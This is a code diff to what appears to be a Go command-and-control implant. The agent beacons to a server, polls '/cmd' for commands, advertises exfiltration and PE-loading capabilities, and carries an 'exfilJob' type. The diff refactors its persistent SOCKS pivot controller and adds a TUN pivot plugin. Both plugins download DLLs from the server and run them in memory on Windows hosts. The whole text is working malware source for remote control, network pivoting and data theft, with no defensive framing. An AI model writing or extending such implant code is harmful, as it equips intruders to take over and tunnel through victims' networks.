@@ -40,6 +40,7 @@ type commandResponse struct {
 	Command     string `json:"command"`
 	Type        string `json:"type"`
 	SocksActive bool   `json:"socks_active"`
+	TunActive   bool   `json:"tun_active"`
 }
 
 type exfilJob struct {
@@ -85,8 +86,10 @@ func main() {
 	logf("starting agent for %s", cfg.BaseURL)
 	rng := rand.New(rand.NewSource(time.Now().UnixNano()))
 	client := newHTTPClient(cfg)
-	pivot := newSocksPluginController()
-	defer pivot.stop()
+	socksPlugin := newPluginController("/tools/plugins/socks.dll")
+	tunPlugin := newPluginController("/tools/plugins/tun.dll")
+	defer socksPlugin.stop()
+	defer tunPlugin.stop()
 
 	for {
 		if err := register(client, cfg); err != nil {
@@ -98,7 +101,7 @@ func main() {
 			sleepWithJitter(cfg, rng)
 			continue
 		}
-		if err := pollOnce(client, cfg, pivot); err != nil {
+		if err := pollOnce(client, cfg, socksPlugin, tunPlugin); err != nil {
 			if err.Error() == "session terminated by server" {
 				return
 			}
@@ -108,20 +111,21 @@ func main() {
 	}
 }
 
-// socksPluginController keeps the persistent pivot plugin outside the normal
+// pluginController keeps one persistent pivot plugin outside the normal
 // beacon command path. The server-side relay remains the source of truth for
-// its lifetime; the plugin exits after the relay is stopped.
-type socksPluginController struct {
+// its lifetime; the child exits after that relay is stopped.
+type pluginController struct {
 	mu      sync.Mutex
 	running bool
 	cancel  context.CancelFunc
+	path    string
 }
 
-func newSocksPluginController() *socksPluginController {
-	return &socksPluginController{}
+func newPluginController(path string) *pluginController {
+	return &pluginController{path: path}
 }
 
-func (p *socksPluginController) syncActive(active bool, client *http.Client, cfg *config) {
+func (p *pluginController) syncActive(active bool, client *http.Client, cfg *config) {
 	if runtime.GOOS != "windows" || runtime.GOARCH != "amd64" {
 		return
 	}
@@ -142,7 +146,7 @@ func (p *socksPluginController) syncActive(active bool, client *http.Client, cfg
 				"session_id":    cfg.SessionID,
 				"http_proxy":    cfg.HTTPProxy,
 			})
-			_, _ = loadPluginPEContext(ctx, client, cfg, "/tools/plugins/socks.dll", "Run", string(input))
+			_, _ = loadPluginPEContext(ctx, client, cfg, p.path, "Run", string(input))
 			p.mu.Lock()
 			p.running = false
 			p.cancel = nil
@@ -157,7 +161,7 @@ func (p *socksPluginController) syncActive(active bool, client *http.Client, cfg
 	}
 }
 
-func (p *socksPluginController) stop() {
+func (p *pluginController) stop() {
 	p.mu.Lock()
 	cancel := p.cancel
 	p.mu.Unlock()
@@ -222,7 +226,7 @@ func register(client *http.Client, cfg *config) error {
 	v.Set("sync", "1")
 	v.Set("agent", "go")
 	if runtime.GOOS == "windows" && runtime.GOARCH == "amd64" {
-		v.Set("caps", "pe,rclone-plugin,socks-plugin")
+		v.Set("caps", "pe,rclone-plugin,socks-plugin,tun-plugin")
 	} else {
 		v.Set("caps", "")
 	}
@@ -233,12 +237,14 @@ func register(client *http.Client, cfg *config) error {
 func pollOnce(
 	client *http.Client,
 	cfg *config,
-	pivot *socksPluginController,
+	socksPlugin *pluginController,
+	tunPlugin *pluginController,
 ) error {
 	data, err := request(client, cfg, http.MethodGet, "/cmd", values(cfg), nil)
 	if err != nil {
 		if isPermanentHTTPError(err) {
-			pivot.syncActive(false, client, cfg)
+			socksPlugin.syncActive(false, client, cfg)
+			tunPlugin.syncActive(false, client, cfg)
 		}
 		return err
 	}
@@ -246,7 +252,8 @@ func pollOnce(
 	if err := json.Unmarshal(data, &reply); err != nil {
 		return err
 	}
-	pivot.syncActive(reply.SocksActive, client, cfg)
+	socksPlugin.syncActive(reply.SocksActive, client, cfg)
+	tunPlugin.syncActive(reply.TunActive, client, cfg)
 	if strings.TrimSpace(reply.Command) == "" {
 		_ = register(client, cfg)
 		return nil
